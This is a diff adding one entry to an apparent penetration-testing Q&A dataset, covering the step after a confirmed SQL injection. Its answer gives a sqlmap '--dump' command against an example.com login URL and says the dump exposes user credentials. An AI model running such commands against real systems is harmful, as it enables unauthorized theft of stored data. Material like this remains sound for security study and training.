@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What is the next step after confirming a SQL injection vulnerability?
+
+CONTEXT:
+You successfully extracted data from the database using sqlmap.
+
+METHOD / ANSWER:
+Command: `sqlmap -u "http://example.com/login?username=admin&password=test" --dump`
+Explanation: This command dumps the database content, allowing you to analyze sensitive data such as user credentials.
